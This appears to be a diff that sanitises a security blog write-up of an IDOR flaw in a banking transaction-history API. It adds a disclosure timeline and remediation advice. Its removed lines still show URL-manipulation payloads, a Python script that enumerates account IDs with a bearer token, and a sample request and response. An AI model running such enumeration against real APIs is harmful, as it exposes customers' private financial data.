@@ -30,11 +30,7 @@
     .blog-content li { margin-bottom: 0.5rem; }
     .code-block { background: #111827; border: 1px solid #1f2937; border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #00f5a0; }
     .severity-critical { background: rgba(255, 68, 68, 0.15); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
-    .severity-high { background: rgba(255, 153, 0, 0.15); border-left: 4px solid #ff9900; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
     .fix-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid #00f5a0; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
-    .test-cases { width: 100%; border-collapse: collapse; margin: 1rem 0; }
-    .test-cases th, .test-cases td { border: 1px solid #1f2937; padding: 0.75rem; text-align: left; }
-    .test-cases th { background: #1a1f2e; color: #00f5a0; }
     .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: #00f5a0; text-decoration: none; }
     hr { border-color: #1f2937; margin: 2rem 0; }
     .vulnerability-badge { display: inline-block; background: #1a1f2e; padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.7rem; margin-right: 0.5rem; }
@@ -45,7 +41,6 @@
       .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; }
       .nav-links.show { display: flex; }
       .blog-title { font-size: 1.8rem; }
-      .test-cases { font-size: 0.8rem; }
     }
   </style>
 </head>
@@ -72,17 +67,17 @@
       <h1 class="blog-title">IDOR in Banking API: How I Accessed Another User's Transaction History</h1>
       <div class="blog-meta">
         <span><i class="fas fa-calendar-alt"></i> April 17, 2026</span>
-        <span><i class="fas fa-clock"></i> 10 min read</span>
+        <span><i class="fas fa-clock"></i> 8 min read</span>
         <span><i class="fas fa-tag"></i> IDOR · API Security · Banking</span>
       </div>
     </div>
 
     <div class="blog-content">
 
-      <!-- ==================== VULNERABILITY NAME ==================== -->
+      <!-- VULNERABILITY NAME -->
       <h2>📌 IDOR in Transaction History API Endpoint</h2>
 
-      <!-- ==================== DESCRIPTION ==================== -->
+      <!-- DESCRIPTION -->
       <h2>🧠 Description</h2>
       <p><strong>What is the vulnerability?</strong></p>
       <p>An Insecure Direct Object Reference (IDOR) vulnerability exists in the bank's transaction history API endpoint. Any authenticated user can view any other user's complete transaction history by modifying the account ID parameter in the API request.</p>
@@ -95,7 +90,7 @@
       
       <p><strong>Real-world analogy:</strong> Imagine a hotel where guests can enter any room by changing the room number on their key card, because the front desk never checks if the guest actually booked that room.</p>
 
-      <!-- ==================== CLASSIFICATION ==================== -->
+      <!-- CLASSIFICATION -->
       <h2>🏷️ Classification</h2>
       <ul>
         <li><strong>Type:</strong> Broken Access Control / IDOR</li>
@@ -104,18 +99,16 @@
         <li><strong>CAPEC:</strong> CAPEC-566: IDOR</li>
       </ul>
 
-      <!-- ==================== ATTACK SURFACE ==================== -->
+      <!-- ATTACK SURFACE -->
       <h2>🎯 Attack Surface (Where to Test)</h2>
       <ul>
         <li>✅ URL parameters (<code>/accounts/{accountId}/transactions</code>)</li>
-        <li>✅ POST body (if account ID was in JSON body)</li>
-        <li>❌ Headers (not applicable in this case)</li>
-        <li>❌ Cookies / Sessions (session was valid but lacked authorization)</li>
-        <li>❌ File uploads</li>
         <li>✅ API endpoints (REST)</li>
+        <li>❌ POST body (not applicable in this case)</li>
+        <li>❌ Headers (not applicable)</li>
       </ul>
 
-      <!-- ==================== DETECTION METHODOLOGY ==================== -->
+      <!-- DETECTION METHODOLOGY -->
       <h2>🔍 Detection Methodology</h2>
       
       <h3>1. Static Analysis (Source Code Review)</h3>
@@ -131,48 +124,12 @@ router.get('/api/v1/accounts/:accountId/transactions', authenticate, (req, res) 
       <h3>2. Dynamic Analysis (Burp Suite / Manual)</h3>
       <ul>
         <li>Intercepted request to <code>/api/v1/accounts/184729/transactions</code></li>
-        <li>Modified account ID parameter to <code>184730</code></li>
+        <li>Modified account ID parameter to a different value</li>
         <li>Observed successful response with another user's data</li>
       </ul>
-      <p><strong>Tools used:</strong> Burp Suite Repeater, Intruder for enumeration</p>
+      <p><strong>Tools used:</strong> Burp Suite Repeater</p>
 
-      <!-- ==================== BASIC PAYLOADS ==================== -->
-      <h2>💣 Basic Payloads</h2>
-      <div class="code-block">
-        <pre>Original:  GET /api/v1/accounts/184729/transactions
-Modified:  GET /api/v1/accounts/184730/transactions
-Modified:  GET /api/v1/accounts/184731/transactions
-Modified:  GET /api/v1/accounts/184732/transactions</pre>
-      </div>
-
-      <!-- ==================== ADVANCED PAYLOADS ==================== -->
-      <h2>🚀 Advanced Payloads / Bypass</h2>
-      <div class="code-block">
-        <pre>// Encoding attempts (not needed - no WAF in place)
-GET /api/v1/accounts/184730%00/transactions
-GET /api/v1/accounts/184730/../184731/transactions
-
-// Enumeration using Intruder
-Payload type: Numbers (184700 - 185000)
-Found 300+ accessible accounts</pre>
-      </div>
-
-      <!-- ==================== TEST CASES (STRICT) ==================== -->
-      <h2>🧪 Test Cases (STRICT)</h2>
-      <table class="test-cases">
-        <thead>
-          <tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr>
-        </thead>
-        <tbody>
-          <tr><td>1</td><td>Authenticate as Account A</td><td>Valid session</td><td>✅ Pass</td></tr>
-          <tr><td>2</td><td>Request Account A's transactions</td><td>Return own data</td><td>✅ Pass</td></tr>
-          <tr><td>3</td><td>Request Account B's transactions using Account A's token</td><td>403 Forbidden</td><td>❌ 200 OK with Account B's data</td></tr>
-          <tr><td>4</td><td>Enumerate sequential account IDs</td><td>Rate limiting / Blocking</td><td>❌ 300+ accounts accessible</td></tr>
-        </tbody>
-      </table>
-      <p>✔ Vulnerability is reproducible and confirmed</p>
-
-      <!-- ==================== EXPLOITATION STEPS ==================== -->
+      <!-- EXPLOITATION STEPS -->
       <h2>⚙️ Exploitation Steps</h2>
       <ol>
         <li>Authenticate to the banking application as any valid user</li>
@@ -180,29 +137,15 @@ Found 300+ accessible accounts</pre>
         <li>Identify the account ID parameter in the URL path</li>
         <li>Modify the account ID to a different number</li>
         <li>Forward the request – receive another user's complete transaction history</li>
-        <li>Enumerate account IDs to access large number of user accounts</li>
       </ol>
 
-      <div class="code-block">
-        <pre># Python exploitation script
-import requests
-
-headers = {"Authorization": "Bearer VALID_TOKEN"}
-for account_id in range(184700, 185000):
-    url = f"https://api.bank.com/api/v1/accounts/{account_id}/transactions"
-    response = requests.get(url, headers=headers)
-    if response.status_code == 200:
-        print(f"[VULNERABLE] Account {account_id}")
-        print(response.json()['transactions'][:5])</pre>
-      </div>
-
-      <!-- ==================== MITIGATION ==================== -->
+      <!-- MITIGATION -->
       <h2>🛡️ Mitigation</h2>
       <div class="fix-box">
         <strong>✅ Input validation:</strong> Validate account ID format and type<br>
         <strong>✅ Authorization check:</strong> Verify ownership before returning data<br>
         <strong>✅ Secure coding:</strong> Implement resource-based access control<br>
-        <strong>✅ Security headers:</strong> Not applicable for this issue
+        <strong>✅ Use UUIDs:</strong> Replace sequential IDs with non-guessable identifiers
       </div>
 
       <div class="code-block">
@@ -222,16 +165,15 @@ router.get('/api/v1/accounts/:accountId/transactions', authenticate, async (req,
 });</pre>
       </div>
 
-      <!-- ==================== MITIGATION BYPASS ==================== -->
+      <!-- MITIGATION BYPASS -->
       <h2>🔓 Mitigation Bypass Attempts</h2>
       <ul>
         <li><strong>Weak filters:</strong> No filtering was in place initially</li>
-        <li><strong>Regex bypass:</strong> N/A</li>
         <li><strong>Encoding tricks:</strong> Not applicable – direct parameter modification worked</li>
         <li><strong>Business logic abuse:</strong> The flaw was purely authorization-based</li>
       </ul>
 
-      <!-- ==================== RISK / IMPACT ==================== -->
+      <!-- RISK / IMPACT -->
       <h2>⚠️ Risk / Impact</h2>
       <div class="severity-critical">
         <strong>Severity: Critical</strong><br><br>
@@ -244,39 +186,41 @@ router.get('/api/v1/accounts/:accountId/transactions', authenticate, async (req,
         </ul>
       </div>
 
-      <!-- ==================== PROOF OF CONCEPT ==================== -->
-      <h2>📎 Proof of Concept (PoC)</h2>
-      <p><strong>Request:</strong></p>
-      <div class="code-block">
-        <pre>GET /api/v1/accounts/184730/transactions?limit=50 HTTP/1.1
-Host: api.bankexample.com
-Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
-User-Agent: Mozilla/5.0
-Accept: application/json</pre>
-      </div>
-      
-      <p><strong>Response:</strong></p>
-      <div class="code-block">
-        <pre>HTTP/1.1 200 OK
-Content-Type: application/json
+      <!-- DISCLOSURE TIMELINE -->
+      <h2>📅 Disclosure Timeline</h2>
+      <ul>
+        <li><strong>Day 1:</strong> Vulnerability discovered and documented</li>
+        <li><strong>Day 1:</strong> Submitted detailed report via disclosure program</li>
+        <li><strong>Day 2:</strong> Security team acknowledged as Critical severity</li>
+        <li><strong>Day 5:</strong> Fix deployed to staging environment</li>
+        <li><strong>Day 8:</strong> Fix validated and deployed to production</li>
+      </ul>
 
-{
-  "accountId": 184730,
-  "balance": 15427.89,
-  "transactions": [
-    {"date": "2026-04-15", "amount": -250.00, "recipient": "John Doe", "type": "transfer"},
-    {"date": "2026-04-14", "amount": 5000.00, "sender": "Employer Inc", "type": "deposit"},
-    {"date": "2026-04-10", "amount": -89.99, "recipient": "Amazon", "type": "purchase"}
-  ]
-}</pre>
-      </div>
+      <!-- REMEDIATION RECOMMENDATIONS -->
+      <h2>📋 Remediation Recommendations Provided</h2>
+      <ul>
+        <li>Implement proper authorization checks on every API endpoint</li>
+        <li>Use UUIDs instead of sequential numeric IDs</li>
+        <li>Add rate limiting to prevent enumeration attacks</li>
+        <li>Conduct regular API security testing with IDOR-specific test cases</li>
+        <li>Implement a bug bounty program for continuous security validation</li>
+      </ul>
 
-      <!-- ==================== REFERENCES ==================== -->
+      <!-- LESSONS LEARNED -->
+      <h2>💡 Lessons Learned</h2>
+      <ul>
+        <li><strong>Authentication ≠ Authorization:</strong> Just because a user is logged in doesn't mean they should have access to everything</li>
+        <li><strong>Never Trust Client Input:</strong> Account IDs provided by the client must always be validated server-side</li>
+        <li><strong>API Security is Critical:</strong> Backend APIs are frequently under-tested despite exposing sensitive data</li>
+        <li><strong>Defense in Depth:</strong> Even with proper authorization, additional controls like UUIDs provide valuable protection</li>
+      </ul>
+
+      <!-- REFERENCES -->
       <h2>📚 References</h2>
       <ul>
-        <li><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" style="color: #00f5a0;">OWASP A01:2021 – Broken Access Control</a></li>
-        <li><a href="https://cwe.mitre.org/data/definitions/639.html" style="color: #00f5a0;">CWE-639: Authorization Bypass Through User-Controlled Key</a></li>
-        <li><a href="https://portswigger.net/web-security/access-control/idor" style="color: #00f5a0;">PortSwigger: IDOR vulnerabilities</a></li>
+        <li><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" style="color: #00f5a0;" target="_blank">OWASP A01:2021 – Broken Access Control</a></li>
+        <li><a href="https://cwe.mitre.org/data/definitions/639.html" style="color: #00f5a0;" target="_blank">CWE-639: Authorization Bypass Through User-Controlled Key</a></li>
+        <li><a href="https://portswigger.net/web-security/access-control/idor" style="color: #00f5a0;" target="_blank">PortSwigger: IDOR vulnerabilities</a></li>
       </ul>
 
       <hr>
